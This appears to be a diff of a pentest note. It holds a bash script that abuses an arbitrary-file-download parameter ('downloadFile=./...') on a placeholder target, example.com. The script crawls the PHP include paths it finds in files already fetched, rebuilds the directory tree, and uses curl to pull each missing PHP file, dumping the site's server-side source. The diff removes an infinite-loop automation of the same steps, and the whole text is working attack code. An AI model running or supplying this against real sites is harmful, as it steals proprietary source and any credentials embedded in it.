@@ -46,15 +46,4 @@ rm _php-verify; for _file in $(cat _php-files);do find * | grep -w "$_file" || p
 rm _php-check; for _dir in $(grep -aEoR '[^[:space:]]+\.php(?:\/[^[:space:]]+)*' * 2>&- | grep -wEv "_php-files|_php-verify" | awk -F'.php:' '{print $1}' | xargs -I@ sh -c "dirname @" 2>&- | sort -u); for _file in $(cat _php-verify);do printf "\n$_dir/$_file"; done | sort -u >> _php-check
 for _dir in $(sort -u _php-check);do dirname $_dir ;done | sort -u | xargs -I@ sh -c "mkdir -p $PWD/@"
 for _file in $(sort -u _php-check);do curl -Lsk https://example.com/ -XPOST -d "downloadFile=./$_file" -o "$PWD/$_file"; done
-
-# Automation (replace the curl command)
-while :;do
-	printf "\n[*] Press CTRL^c to stop the program [*]\n"
-	printf "\n# _php-verify file content's #\n\t%s\n\n" $(cat _php-verify)
-	grep -aEoR '[^[:space:]]+\.php(?:\/[^[:space:]]+)*' * 2>&- | awk -F'.php:' '{print $2}' | cut -d"'" -f2 | cut -d'"' -f2 | sort -u > _php-files
-	rm _php-verify; for _file in $(cat _php-files);do find * | grep -w "$_file" || printf "\n$_file" >> _php-verify ; done
-	rm _php-check; for _dir in $(grep -aEoR '[^[:space:]]+\.php(?:\/[^[:space:]]+)*' * 2>&- | grep -wEv "_php-files|_php-verify" | awk -F'.php:' '{print $1}' | xargs -I@ sh -c "dirname @" 2>&- | sort -u); for _file in $(cat _php-verify);do printf "\n$_dir/$_file"; done | sort -u >> _php-check
-	for _dir in $(sort -u _php-check);do dirname $_dir ;done | sort -u | xargs -I@ sh -c "mkdir -p $PWD/@"
-	for _file in $(sort -u _php-check);do curl -Lsk https://example.com/ -XPOST -d "downloadFile=./$_file" -o "$PWD/$_file"; done
-done
 ```
